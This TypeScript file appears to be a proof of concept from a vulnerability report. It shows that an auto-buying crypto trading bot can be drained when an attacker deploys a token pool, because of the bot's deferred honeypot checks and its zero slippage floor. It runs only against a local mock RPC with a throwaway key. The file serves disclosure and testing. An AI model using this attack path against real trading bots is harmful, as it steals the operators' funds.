/**
 * PoC: unprivileged on-chain attacker drains the bot wallet via the shipped auto-buy default.
 *
 * WHAT THIS PROVES
 *   The repo ships config.json with autoLp.enabled=true and the chain pool listener running.
 *   src/radar/chainListener.ts polls the public chain for ANY new WETH pool and, for every
 *   one it sees, fires src/radar/autolp.ts:maybeAutoLp with source "feed-new" and a hardcoded
 *   "score 98 / ape" verdict. On a "fast source" the honeypot/security audit is DEFERRED
 *   (fire-first, audit-async), and the buy is executed through
 *   src/chain/swaps.ts:swapWethToTokenMultiFire with amountOutMinimum = 0 (zero slippage floor).
 *
 *   Net effect: any unprivileged attacker who permissionlessly deploys a token + WETH pool on
 *   Robinhood Chain gets the bot to spend real ETH buying that attacker-controlled token, at any
 *   price, with no honeypot gate blocking the trade. The attacker drains the proceeds.
 *
 * HOW THE PoC STAYS SAFE (no real funds / accounts / live services)
 *   - A random throwaway private key is generated in-process (never funded, never used elsewhere).
 *   - The chain is a LOCAL mock JSON-RPC server (127.0.0.1) that emulates Robinhood Chain:
 *       it serves ONE attacker PairCreated log, then captures every eth_sendRawTransaction.
 *   - global fetch is sandboxed: only 127.0.0.1 is allowed out; every other host (GoPlus,
 *     Telegram, KyberSwap, ...) is stubbed, so no live service is contacted.
 *
 *   It runs the REAL, UNMODIFIED vulnerable code: chainListener.pollNewPoolEvents ->
 *   maybeAutoLp -> executeSplitSnipe -> swapWethToTokenMultiFire -> sendExactInput -> sign+broadcast.
 *   The PoC only observes the broadcast transactions; it does not patch any bot logic.
 *
 * RUN
 *   npm install
 *   node --import tsx poc/autobuy-poc.ts
 *   # exits 0 and prints "PoC RESULT: VULNERABLE" when the bot broadcasts the attacker buy.
 */
import http from "node:http";
import fs from "node:fs";
import { fileURLToPath } from "node:url";
import { ethers } from "ethers";

// ─────────────────────────────────────────────────────────────────────────────
// Attacker-controlled, permissionlessly-deployed token + pool (any address works).
// ─────────────────────────────────────────────────────────────────────────────
const WETH = "0x0bd7d308f8e1639fab988df18a8011f41eacad73"; // Robinhood Chain WETH (from config.json)
const V2_FACTORY = "0x8bcEaA40B9AcdfAedF85AdF4FF01F5Ad6517937f"; // a watched factory (chainListener FACTORIES)
const ATTACKER_TOKEN = "0xbadbad0000000000000000000000000000000bad";
const ATTACKER_PAIR = "0xdeadbeef00000000000000000000000000001111";
const TOPIC_V2_PAIR_CREATED = "0x0d3648bd0f6ee80134a33ba0f14a5119d2dfec688d366a110d2b30c37f1162bf";

const SWAP_ROUTER02 = "0xcaf681a66d020601342297493863e78c959e5cb2"; // from config.json

const pad32 = (addr: string): string => "0x" + addr.toLowerCase().replace(/^0x/, "").padStart(64, "0");
const CHAIN_BLOCK = 1000;

// Captured raw transactions broadcast by the bot.
const broadcasts: { raw: string; hash: string }[] = [];
let logsServed = 0;

// ─────────────────────────────────────────────────────────────────────────────
// Local mock JSON-RPC server emulating just enough of Robinhood Chain.
// ─────────────────────────────────────────────────────────────────────────────
function rpcResult(method: string, params: any[]): any {
  switch (method) {
    case "eth_chainId":
      return "0x1237"; // 4663
    case "net_version":
      return "4663";
    case "web3_clientVersion":
      return "poc-mock/1.0";
    case "eth_blockNumber":
      return "0x" + CHAIN_BLOCK.toString(16);
    case "eth_gasPrice":
      return "0x3b9aca00"; // 1 gwei
    case "eth_maxPriorityFeePerGas":
      return "0x3b9aca00";
    case "eth_getBalance":
      return "0xde0b6b3a7640000"; // 1 ETH — plenty for the buy + gas
    case "eth_getTransactionCount":
      return "0x0";
    case "eth_estimateGas":
      return "0x55730";
    case "eth_call":
      // every contract read (WETH balanceOf / allowance, token balanceOf) returns 0
      return "0x" + "0".repeat(64);
    case "eth_getBlockByNumber":
    case "eth_getBlockByHash":
      return {
        number: "0x" + CHAIN_BLOCK.toString(16),
        hash: "0x" + "ab".repeat(32),
        parentHash: "0x" + "cd".repeat(32),
        timestamp: "0x" + Math.floor(Date.now() / 1000).toString(16),
        gasLimit: "0x1c9c380",
        gasUsed: "0x0",
        baseFeePerGas: null,
        miner: "0x" + "00".repeat(20),
        difficulty: "0x0",
        totalDifficulty: "0x0",
        nonce: "0x0000000000000000",
        extraData: "0x",
        transactions: [],
      };
    case "eth_getLogs": {
      // Serve the attacker PairCreated event exactly once (the "new pool" the bot snipes).
      if (logsServed > 0) return [];
      logsServed++;
      return [
        {
          address: V2_FACTORY.toLowerCase(),
          topics: [TOPIC_V2_PAIR_CREATED, pad32(WETH), pad32(ATTACKER_TOKEN)],
          data: pad32(ATTACKER_PAIR) + "0".repeat(64), // pair address + allPairsLength
          blockNumber: "0x" + (CHAIN_BLOCK - 1).toString(16),
          transactionHash: "0x" + "11".repeat(32),
          transactionIndex: "0x0",
          blockHash: "0x" + "22".repeat(32),
          logIndex: "0x0",
          removed: false,
        },
      ];
    }
    case "eth_sendRawTransaction": {
      const raw = params[0] as string;
      const hash = ethers.keccak256(raw); // ethers verifies the node hash == computed hash
      broadcasts.push({ raw, hash });
      return hash;
    }
    case "eth_getTransactionReceipt": {
      const hash = params[0] as string;
      return {
        transactionHash: hash,
        transactionIndex: "0x0",
        blockHash: "0x" + "22".repeat(32),
        blockNumber: "0x" + CHAIN_BLOCK.toString(16),
        from: "0x" + "00".repeat(20),
        to: "0x" + "00".repeat(20),
        cumulativeGasUsed: "0x5208",
        gasUsed: "0x5208",
        contractAddress: null,
        logs: [],
        logsBloom: "0x" + "0".repeat(512),
        status: "0x1",
        type: "0x0",
        effectiveGasPrice: "0x3b9aca00",
      };
    }
    case "eth_feeHistory":
      return { oldestBlock: "0x0", baseFeePerGas: ["0x0", "0x0"], gasUsedRatio: [0], reward: [["0x0"]] };
    default:
      return null;
  }
}

function startMockRpc(): Promise<{ url: string; close: () => void }> {
  return new Promise((resolve) => {
    const server = http.createServer((req, res) => {
      let body = "";
      req.on("data", (c) => (body += c));
      req.on("end", () => {
        let reqs: any;
        try {
          reqs = JSON.parse(body);
        } catch {
          res.writeHead(400).end();
          return;
        }
        const arr = Array.isArray(reqs) ? reqs : [reqs];
        const out = arr.map((r) => ({ jsonrpc: "2.0", id: r.id, result: rpcResult(r.method, r.params ?? []) }));
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify(Array.isArray(reqs) ? out : out[0]));
      });
    });
    server.listen(0, "127.0.0.1", () => {
      const port = (server.address() as any).port;
      resolve({ url: "http://127.0.0.1:" + port, close: () => server.close() });
    });
  });
}

// ─────────────────────────────────────────────────────────────────────────────
// fetch sandbox: localhost (our mock RPC) passes through; everything else is stubbed,
// so GoPlus / Telegram / KyberSwap are never actually contacted.
// ─────────────────────────────────────────────────────────────────────────────
function sandboxFetch(): void {
  const real = globalThis.fetch.bind(globalThis);
  globalThis.fetch = (async (input: any, init?: any) => {
    const url = typeof input === "string" ? input : input?.url ?? String(input);
    if (url.includes("127.0.0.1") || url.includes("localhost")) return real(input, init);
    return new Response(JSON.stringify({}), { status: 200, headers: { "content-type": "application/json" } });
  }) as typeof fetch;
}

async function main(): Promise<void> {
  // Start from a clean slate so the run is reproducible: the chain listener persists a
  // "seen pools" set to data/, and a stale entry would make it skip the attacker pool.
  const dataDir = fileURLToPath(new URL("../data/", import.meta.url));
  for (const f of ["chain-seen-pools.json", "autolp-state.json", "blacklist.json"]) {
    try {
      fs.rmSync(dataDir + f, { force: true });
    } catch {
      /* ignore */
    }
  }

  const mock = await startMockRpc();
  sandboxFetch();

  // Configure the bot to talk ONLY to the mock chain, with a throwaway (unfunded) key.
  const throwaway = ethers.Wallet.createRandom();
  process.env.RH_RPC_URL = mock.url;
  process.env.RH_WALLET_KEY = throwaway.privateKey;
  process.env.RH_TG_TOKEN = "poc:dummy";
  delete process.env.RH_TG_CHAT;
  delete process.env.RH_FAST_SUBMIT;

  // Import the REAL bot code AFTER env is set (config reads env at import time).
  const { cfg } = await import("../src/config.js");
  const { pollNewPoolEvents } = await import("../src/radar/chainListener.js");

  console.log("── shipped config (config.json, unmodified) ──");
  console.log("  autoLp.enabled   =", cfg.autoLp.enabled);
  console.log("  autoLp.mode      =", cfg.autoLp.mode);
  console.log("  autoLp.requireLlm=", cfg.autoLp.requireLlm);
  console.log("  autoLp.sources   =", JSON.stringify(cfg.autoLp.sources));
  console.log("  bot wallet       =", throwaway.address, "(random, unfunded)");
  console.log("  attacker token   =", ATTACKER_TOKEN);
  console.log("");
  console.log("Attacker deploys a WETH pool on-chain; bot's chain listener polls once...");

  await pollNewPoolEvents();

  // maybeAutoLp is dispatched via 'void' (fire-and-forget); wait for the broadcast.
  const deadline = Date.now() + 15000;
  const iface = new ethers.Interface([
    "function exactInputSingle((address tokenIn, address tokenOut, uint24 fee, address recipient, uint256 amountIn, uint256 amountOutMinimum, uint160 sqrtPriceLimitX96)) payable returns (uint256)",
  ]);

  let buy: { hash: string; tokenOut: string; amountIn: bigint; amountOutMinimum: bigint } | null = null;
  while (Date.now() < deadline && !buy) {
    for (const b of broadcasts) {
      const parsed = ethers.Transaction.from(b.raw);
      if ((parsed.to ?? "").toLowerCase() !== SWAP_ROUTER02.toLowerCase()) continue;
      try {
        const d = iface.parseTransaction({ data: parsed.data });
        if (d?.name === "exactInputSingle") {
          const p = d.args[0];
          buy = {
            hash: b.hash,
            tokenOut: String(p.tokenOut),
            amountIn: BigInt(p.amountIn),
            amountOutMinimum: BigInt(p.amountOutMinimum),
          };
          break;
        }
      } catch {
        /* not a swap */
      }
    }
    if (!buy) await new Promise((r) => setTimeout(r, 200));
  }

  console.log("");
  console.log("Transactions the bot broadcast to the (mock) chain: " + broadcasts.length);

  mock.close();

  if (!buy) {
    console.log("");
    console.log("PoC RESULT: NOT reproduced (no swap broadcast). Code may be fixed.");
    process.exit(1);
  }

  console.log("");
  console.log("┌─ BOT BROADCAST AN UNSOLICITED BUY OF THE ATTACKER TOKEN ─");
  console.log("│ tx hash          :", buy.hash);
  console.log("│ router (tx.to)    :", SWAP_ROUTER02);
  console.log(
    "│ tokenOut (bought) :",
    buy.tokenOut,
    buy.tokenOut.toLowerCase() === ATTACKER_TOKEN.toLowerCase() ? "== attacker token OK" : "(?)",
  );
  console.log("│ amountIn (WETH)   :", ethers.formatEther(buy.amountIn), "ETH of real funds");
  console.log(
    "│ amountOutMinimum  :",
    buy.amountOutMinimum.toString(),
    buy.amountOutMinimum === 0n ? "== 0  -> ZERO slippage protection" : "",
  );
  console.log("└──────────────────────────────────────────────────────────");
  console.log("");

  const ok = buy.tokenOut.toLowerCase() === ATTACKER_TOKEN.toLowerCase() && buy.amountOutMinimum === 0n;
  console.log("PoC RESULT:", ok ? "VULNERABLE - unprivileged attacker drains bot via auto-buy" : "INCONCLUSIVE");
  process.exit(ok ? 0 : 1);
}

main().catch((e) => {
  console.error("PoC error:", e);
  process.exit(2);
});
